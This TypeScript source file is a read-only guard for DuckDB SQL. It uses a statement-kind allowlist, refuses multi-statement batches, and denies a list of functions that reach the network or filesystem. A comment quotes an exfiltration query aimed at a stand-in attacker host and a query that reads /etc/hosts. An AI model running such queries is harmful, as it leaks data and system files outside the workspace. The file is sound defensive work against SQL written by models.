import { DateraError } from '../errors.js';
import { maskLiterals } from './scan-sql.js';
import type { DuckDBConnectionPort, StatementKind } from '../ports/duckdb.js';

/**
 * Functions a user's or a model's SQL may not call.
 *
 * The statement-kind allowlist refuses INSTALL, LOAD, ATTACH and COPY — but it says
 * nothing about what a SELECT *calls*, and the scanner extensions are loaded at startup.
 * So `SELECT * FROM postgres_scan('host=attacker.tld …')` was one bound SELECT that
 * passed the guard and opened an outbound connection, and `read_csv('/etc/hosts')`
 * returned the file. Both verified.
 *
 * That is the exfiltration primitive this product can least afford, because the SQL is
 * routinely written by a model. The egress test could not catch it either: it patches
 * Node's sockets, and this happens inside DuckDB's native addon.
 *
 * Datera's own reads go through `executeInternal`, which does not pass through this guard,
 * so denying these here costs the product nothing — a dataset is queried through its
 * views, never by naming a file.
 */
const REACHING_FUNCTIONS: readonly string[] = [
  // Another database, over the network.
  'postgres_scan', 'postgres_scan_pushdown', 'postgres_query', 'postgres_attach',
  'mysql_scan', 'mysql_query', 'mysql_attach',
  'sqlite_scan', 'sqlite_attach', 'sqlite_query',
  // The filesystem, or a URL, by name.
  'read_csv', 'read_csv_auto', 'read_parquet', 'parquet_scan',
  'read_json', 'read_json_auto', 'read_ndjson', 'read_ndjson_auto', 'read_json_objects',
  'read_text', 'read_blob', 'read_xlsx',
  'glob', 'parquet_metadata', 'parquet_schema', 'parquet_file_metadata',
  'iceberg_scan', 'iceberg_metadata', 'delta_scan',
];

const REACHING_RE = new RegExp(`\\b(${REACHING_FUNCTIONS.join('|')})\\s*\\(`, 'i');

/**
 * Refuse a statement that calls out of the workspace.
 *
 * Checked against the statement with literals blanked, so a value that merely contains the
 * text `read_csv(` is data and not a call.
 */
export function assertNoReachingFunctions(sql: string): void {
  const match = REACHING_RE.exec(maskLiterals(sql));
  if (match === null) return;

  throw new DateraError(
    'READ_ONLY_VIOLATION',
    `${match[1]}() reads from outside this workspace, so it is not allowed here. ` +
      'Connect the file or database as a source instead — then it is visible, versioned, ' +
      'and read the same way as everything else.',
    { function: match[1], sql },
  );
}

/**
 * Invariant §1.1 / §1.2, expressed as code.
 *
 * Only these statement kinds may come from a user or, later, from a model. Everything
 * else — including COPY (which writes a file), ATTACH (which reaches a new database),
 * and LOAD/INSTALL (which reaches the network) — is refused.
 *
 * DESCRIBE, SHOW, SUMMARIZE and PRAGMA table_info all parse as SELECT in DuckDB, so this
 * two-entry allowlist covers every read path without needing to enumerate syntax.
 */
export const READ_ONLY_STATEMENT_KINDS: ReadonlySet<StatementKind> = new Set<StatementKind>([
  'SELECT',
  'EXPLAIN',
]);

export interface ReadOnlyCheck {
  readonly sql: string;
  readonly statementKinds: readonly (StatementKind | 'UNKNOWN')[];
  /**
   * How the verdict was reached. Recorded because "why was my query refused" is a
   * transparency question (spec §1.4), and "the guard said so" is not an answer.
   */
  readonly basis: 'bound' | 'parser-vouched-select';
}

/**
 * Classify every statement in `sql` and throw unless all of them are read-only.
 *
 * Classification comes from DuckDB's own parser via the driver, never from matching the
 * text: a regex guard is defeated by comments, string literals, and unusual whitespace,
 * and this is a correctness boundary, not a lint.
 *
 * The subtle case is a statement DuckDB can parse but not *bind*. `DELETE FROM a_view`
 * fails to bind, so no statement type is available — and a guard that gave up there would
 * report a confusing binder error instead of refusing a delete. So when binding fails we
 * fall back to the parser, which can still vouch that the input is exactly one SELECT:
 *
 *   - parser vouches SELECT  -> allow it through, and let the real binder error surface
 *                               (this is `SELECT * FROM typo_table`, a broken read);
 *   - parser does not vouch  -> refuse (this is `DELETE FROM a_view`, a write).
 *
 * The fallback fails closed. Anything we cannot prove is read-only is treated as a write.
 */
export async function assertReadOnlySql(
  conn: DuckDBConnectionPort,
  sql: string,
): Promise<ReadOnlyCheck> {
  const trimmed = sql.trim();
  if (trimmed.length === 0) {
    throw new DateraError('INVALID_ARGUMENT', 'Empty SQL statement');
  }

  // Before classification, because this is true of the text regardless of how it parses,
  // and because a refusal here should not depend on the binder succeeding — a reaching
  // call against an unreachable host would otherwise fail as a connection error rather
  // than as a refusal.
  assertNoReachingFunctions(trimmed);

  // A parse failure throws SQL_ERROR from the driver and is deliberately not caught here:
  // a syntax error is a broken query, not an attempted write, and must not be reported
  // as a read-only violation.
  const classification = await conn.classify(trimmed);
  const statements = classification.statements;

  if (statements.length === 0) {
    throw new DateraError('INVALID_ARGUMENT', 'No statement found in the supplied SQL', {
      sql: trimmed,
    });
  }

  const kinds = statements.map((s) => s.kind);

  // A batch is refused before anything else: one question, one answer, one traceable
  // statement. Batching is how a second statement hides behind an innocuous first one.
  if (statements.length > 1) {
    throw new DateraError(
      'READ_ONLY_VIOLATION',
      'Refused a multi-statement batch; run one statement at a time.',
      { sql: trimmed, statementCount: statements.length, statementKinds: kinds },
    );
  }

  const known = statements.filter((s) => s.kind !== 'UNKNOWN');
  const offending = [
    ...new Set(
      known.map((s) => s.kind as StatementKind).filter((k) => !READ_ONLY_STATEMENT_KINDS.has(k)),
    ),
  ];

  if (offending.length > 0) {
    throw new DateraError(
      'READ_ONLY_VIOLATION',
      `Datera is read-only. Refused: ${offending.join(', ')}.`,
      { sql: trimmed, statementKinds: kinds, offending },
    );
  }

  if (known.length === statements.length) {
    return { sql: trimmed, statementKinds: kinds, basis: 'bound' };
  }

  if (classification.isSingleSelect) {
    return { sql: trimmed, statementKinds: ['SELECT'], basis: 'parser-vouched-select' };
  }

  const bindError = statements.find((s) => s.bindError !== undefined)?.bindError;
  throw new DateraError(
    'READ_ONLY_VIOLATION',
    'Datera is read-only, and this statement could not be shown to be a read. Refused.',
    { sql: trimmed, statementKinds: kinds, bindError: bindError ?? null },
  );
}
